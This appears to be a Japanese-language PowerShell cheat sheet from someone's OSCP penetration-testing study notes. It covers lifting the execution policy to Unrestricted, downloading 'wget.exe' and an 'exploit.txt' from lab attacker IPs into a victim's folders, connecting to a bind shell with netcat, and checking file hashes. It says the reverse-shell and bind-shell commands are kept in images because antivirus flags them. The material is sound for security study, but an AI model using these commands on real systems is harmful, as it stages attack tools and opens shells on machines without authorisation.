# PowerShell

### 実行権限

```powershell
powershell
Get-ExecutionPolicy -Scope CurrentUser
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
Get-ExecutionPolicy -Scope CurrentUser
```



### ファイル転送

```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
```

```cmd
powershell -NoProfile -ExecutionPolicy unrestricted -Command (Invoke-WebRequest -Uri "http://192.168.119.127:5555/exploit.txt" -OutFile "exploit.txt")
```



##### ダウンロードせずに実行する場合は・・・

AVに検知されるので画像

![image-20230105081915662](img/powershell/image-20230105081915662.png)



### リバースシェル※AVに検知されるためここに記載することができない

OSCP_cheetsheet(Excel)に記載している。

![image-20221226084237435](img/powershell/image-20221226084237435.png)



### バインドシェル※AVに検知されるためここに記載することができない

OSCP_cheetsheet(Excel)に記載している。

![image-20221226084638580](img/powershell/image-20221226084638580.png)

* netcatでバインドシェルに接続する

  ```
  nc -nv 10.11.0.22 443
  ```

  

### チェックサム

```powershell
Get-FileHash -Algorithm "SHA256" -Path "C:\Users\student\exploit.txt"

$hash1 = ""
$hash2 = ""
$hash1 -eq $hash2
```



